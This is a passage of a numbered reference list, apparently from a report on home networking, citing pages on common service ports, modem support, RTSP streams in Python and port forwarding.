23. SpeedGuide. (n.d.). *Port 3389 Details* [online] speed guide.net. Available at: [https://www.speedguide.net/port.php?port=3389](https://www.speedguide.net/port.php?port=3389) [Accessed 25 October 2024].
24. SpeedGuide. (n.d.). *Port 445 Details* [online] speed guide.net. Available at: [https://www.speedguide.net/port.php?port=445](https://www.speedguide.net/port.php?port=445) [Accessed 25 October 2024].
25. SpeedGuide. (n.d.). *Port 5900 Details* [online] speed guide.net. Available at: [https://www.speedguide.net/port.php?port=5900](https://www.speedguide.net/port.php?port=5900) [Accessed 25 October 2024].
26. sushan. (2022). *How to Use Compatibility Mode in Microsoft Edge* [online] TechNewsToday. Available at: [https://www.technewstoday.com/how-to-use-edge-compatibility-mode](https://www.technewstoday.com/how-to-use-edge-compatibility-mode) [Accessed 16 October 2024].
27. Telstra. (n.d.). *Get help with my Telstra Smart Modem* [online] Telstra. Available at: [https://www.telstra.com.au/support/internet-and-home-phone/telstra-smart-modem-support](https://www.telstra.com.au/support/internet-and-home-phone/telstra-smart-modem-support) [Accessed 09 October 2024].
28. venkat. (2018). *Read Frames from RTSP Stream in Python* [online] Stack Overflow. Available at: [https://stackoverflow.com/questions/17961318/read-frames-from-rtsp-stream-in-python](https://stackoverflow.com/questions/17961318/read-frames-from-rtsp-stream-in-python) [Accessed 14 October 2024].
29. Wikipedia. (2024). *Host (network)* [online] Wikipedia. Available at: [https://en.wikipedia.org/wiki/Host_(network)](https://en.wikipedia.org/wiki/Host_(network)) [Accessed 09 October 2024].
30. Wikipedia. (2024). *Multicast address* [online] Wikipedia. Available at: [https://en.wikipedia.org/wiki/Multicast_address](https://en.wikipedia.org/wiki/Multicast_address) [Accessed 09 October 2024].
31. Wikipedia. (2024). *Port forwarding* [online] Wikipedia. Available at: [https://en.wikipedia.org/wiki/Port_forwarding](https://en.wikipedia.org/wiki/Port_forwarding) [Accessed 12 October 2024].